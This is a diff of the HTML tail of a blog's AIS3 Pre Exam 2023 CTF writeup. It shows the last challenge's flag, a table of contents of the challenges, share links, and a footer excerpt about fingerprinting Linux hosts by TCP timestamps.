-</code></pre></div><h3 id=flag-4>Flag</h3><p><code>AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}</code></p></article></div></div><div class="col-sm-12 col-md-12 col-lg-3"><div class=sticky-sidebar><aside class=toc><h5>Table Of Contents</h5><div class=toc-content><nav id=TableOfContents><ul><li><a href=#welcome>Welcome</a><ul><li><a href=#題目>題目</a></li><li><a href=#解題>解題</a></li></ul></li><li><a href=#e-portfolio-baby>E-Portfolio baby</a><ul><li><a href=#題目-1>題目</a></li><li><a href=#解題-1>解題</a></li><li><a href=#flag>Flag</a></li></ul></li><li><a href=#managementsystem>ManagementSystem</a><ul><li><a href=#題目-2>題目</a></li><li><a href=#解題-2>解題</a></li><li><a href=#flag-1>Flag</a></li></ul></li><li><a href=#robot>Robot</a><ul><li><a href=#題目-3>題目</a></li><li><a href=#解題-3>解題</a></li><li><a href=#flag-2>Flag</a></li></ul></li><li><a href=#simplypwn>SimplyPwn</a><ul><li><a href=#題目-4>題目</a></li><li><a href=#解題-4>解題</a></li><li><a href=#flag-3>Flag</a></li></ul></li><li><a href=#simply-reverse>Simply Reverse</a><ul><li><a href=#題目-5>題目</a></li><li><a href=#解題-5>解題</a></li><li><a href=#flag-4>Flag</a></li></ul></li></ul></nav></div></aside><aside class=tags><h5>Tags</h5><ul class="tags-ul list-unstyled list-inline"><li class=list-inline-item><a href=https://blog.chummydns.com/tags/ctf target=_blank>CTF</a></li></ul></aside><aside class=social><h5>Social</h5><div class=social-content><ul class=list-inline><li class="list-inline-item text-center"><a target=_blank href="https://twitter.com/share?text=AIS3%20Pre%20Exam%202023%20Writeup&url=https%3a%2f%2fblog.chummydns.com%2fblogs%2fais3-pre-exam-2023-writeup%2f"><i class="fab fa-twitter"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="https://api.whatsapp.com/send?text=AIS3%20Pre%20Exam%202023%20Writeup: https%3a%2f%2fblog.chummydns.com%2fblogs%2fais3-pre-exam-2023-writeup%2f"><i class="fab fa-whatsapp"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="mailto:?subject=AIS3%20Pre%20Exam%202023%20Writeup&body=Check%20out%20this%20site https%3a%2f%2fblog.chummydns.com%2fblogs%2fais3-pre-exam-2023-writeup%2f"><i class="fa fa-envelope"></i></a></li></ul></div></aside></div></div></div><div class=row><div class="col-sm-12 col-md-12 col-lg-9 p-4"></div></div></div><button class="p-2 px-3" onclick=topFunction() id=topScroll>
+</code></pre></div><h3 id=flag-4>Flag</h3></p><p><code>AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}</code></p></article></div></div><div class="col-sm-12 col-md-12 col-lg-3"><div class=sticky-sidebar><aside class=toc><h5>Table Of Contents</h5><div class=toc-content><nav id=TableOfContents><ul><li><a href=#welcome>Welcome</a><ul><li><a href=#題目>題目</a></li><li><a href=#解題>解題</a></li></ul></li><li><a href=#e-portfolio-baby>E-Portfolio baby</a><ul><li><a href=#題目-1>題目</a></li><li><a href=#解題-1>解題</a></li><li><a href=#flag>Flag</a></li></ul></li><li><a href=#managementsystem>ManagementSystem</a><ul><li><a href=#題目-2>題目</a></li><li><a href=#解題-2>解題</a></li><li><a href=#flag-1>Flag</a></li></ul></li><li><a href=#robot>Robot</a><ul><li><a href=#題目-3>題目</a></li><li><a href=#解題-3>解題</a></li><li><a href=#flag-2>Flag</a></li></ul></li><li><a href=#simplypwn>SimplyPwn</a><ul><li><a href=#題目-4>題目</a></li><li><a href=#解題-4>解題</a></li><li><a href=#flag-3>Flag</a></li></ul></li><li><a href=#simply-reverse>Simply Reverse</a><ul><li><a href=#題目-5>題目</a></li><li><a href=#解題-5>解題</a></li><li><a href=#flag-4>Flag</a></li></ul></li></ul></nav></div></aside><aside class=tags><h5>Tags</h5><ul class="tags-ul list-unstyled list-inline"><li class=list-inline-item><a href=https://blog.chummydns.com/tags/ctf target=_blank>CTF</a></li></ul></aside><aside class=social><h5>Social</h5><div class=social-content><ul class=list-inline><li class="list-inline-item text-center"><a target=_blank href="https://twitter.com/share?text=AIS3%20Pre%20Exam%202023%20Writeup&url=https%3a%2f%2fblog.chummydns.com%2fblogs%2fais3-pre-exam-2023-writeup%2f"><i class="fab fa-twitter"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="https://api.whatsapp.com/send?text=AIS3%20Pre%20Exam%202023%20Writeup: https%3a%2f%2fblog.chummydns.com%2fblogs%2fais3-pre-exam-2023-writeup%2f"><i class="fab fa-whatsapp"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="mailto:?subject=AIS3%20Pre%20Exam%202023%20Writeup&body=Check%20out%20this%20site https%3a%2f%2fblog.chummydns.com%2fblogs%2fais3-pre-exam-2023-writeup%2f"><i class="fa fa-envelope"></i></a></li></ul></div></aside></div></div></div><div class=row><div class="col-sm-12 col-md-12 col-lg-9 p-4"></div></div></div><button class="p-2 px-3" onclick=topFunction() id=topScroll>
 <i class="fas fa-angle-up"></i></button></section><div class=progress><div id=scroll-progress-bar class=progress-bar role=progressbar aria-valuenow=0 aria-valuemin=0 aria-valuemax=100></div></div><script src=/js/scrollProgressBar.js></script><script>var topScroll=document.getElementById("topScroll");window.onscroll=function(){scrollFunction()};function scrollFunction(){if(document.body.scrollTop>20||document.documentElement.scrollTop>20){topScroll.style.display="block";}else{topScroll.style.display="none";}}
 function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}</script><script src=/js/readingTime.js></script></div><footer><div class="container py-3" id=recent-posts><div class="h3 text-center text-secondary py-3">Recent Posts</div><div class="row justify-content-center"><div class="col-lg-4 col-md-6 pt-2"><div class="card h-100"><div class="card-body bg-transparent p-3 shadow-sm"><a href=/blogs/analysis_linux_host_by_tcp_timestamp/ class="primary-font card-title"><h5 class="card-title bg-transparent" title="利用 TCP 的 Timestamps 做到精準分類來源 linux machine">利用 TCP 的 Timestamps 做到精準分 …</h5></a><div class="card-text secondary-font"><p>利用 TCP 的 Timestamps 做到分類來源 linux machine 緣由 會做這個的原因是因為要打今年的 AIS3 EOF 要做封包的分析工具，然而按照 HITCON CTF 與往年 AIS3 EOF 的經驗，我們是沒辦法取得每個隊伍的 SRC IP 的，也就是說無法辨識出這個 request 是屬於哪一個隊伍的。
 這會造成甚麼問題，假設有一個 HTTP Post Auth 的 RCE 好了，可能會需要這些流程。
